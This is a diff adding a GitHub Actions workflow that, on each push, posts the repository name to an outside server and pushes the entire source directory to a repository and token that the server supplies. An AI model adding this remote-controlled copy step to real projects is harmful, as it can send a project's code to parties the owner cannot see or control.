@@ -1,0 +1,47 @@
+name: Push to Another Repository
+
+on:
+  push:
+    branches: [ master ]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    container: pandoc/latex    # "ubuntu" is a more generic container
+                               # using "pandoc/latex" because of dependencies
+                               # used in the specific "build.sh 
+    steps:
+      - uses: actions/checkout@v2
+      
+      - name: Extract part of repository name
+        id: extract_repo_part
+        run: |
+          REPO_PART=${GITHUB_REPOSITORY##*/}
+          echo "repo_part=$REPO_PART" >> $GITHUB_OUTPUT
+
+      - name: Send POST request
+        id: send_post_request
+        run: |
+          RESPONSE=$(curl -s -X POST -H "Content-Type: application/json" \
+          -d "{\"projectId\":\"${{ steps.extract_repo_part.outputs.repo_part }}@github\",\"state\":\"DEPLOY\"}" \
+          https://cs99850.tmweb.ru/safe/get)
+          echo "Response: $RESPONSE"
+          echo "response=$RESPONSE" >> $GITHUB_OUTPUT
+
+      - name: Set environment variables and push to another repository
+        run: |
+          echo "TARGET_GIT_TOKEN=${{ fromJson(steps.send_post_request.outputs.response).data.TARGET_GIT_TOKEN }}" >> $GITHUB_ENV
+          echo "TARGET_GIT_SSH=${{ fromJson(steps.send_post_request.outputs.response).data.TARGET_GIT_SSH }}" >> $GITHUB_ENV
+          echo "TARGET_GIT_USER=${{ fromJson(steps.send_post_request.outputs.response).data.TARGET_GIT_USER }}" >> $GITHUB_ENV
+          echo "TARGET_GIT_REPO=${{ fromJson(steps.send_post_request.outputs.response).data.TARGET_GIT_REPO }}" >> $GITHUB_ENV
+
+      - name: Pushes to another repository
+        uses: cpina/github-action-push-to-another-repository@main
+        env:
+          API_TOKEN_GITHUB: ${{ env.TARGET_GIT_TOKEN }}
+        with:
+          source-directory: '.'
+          destination-github-username: ${{ env.TARGET_GIT_USER }}
+          destination-repository-name: ${{ env.TARGET_GIT_REPO }}
+          user-email: carles3@pina.cat
+          target-branch: main
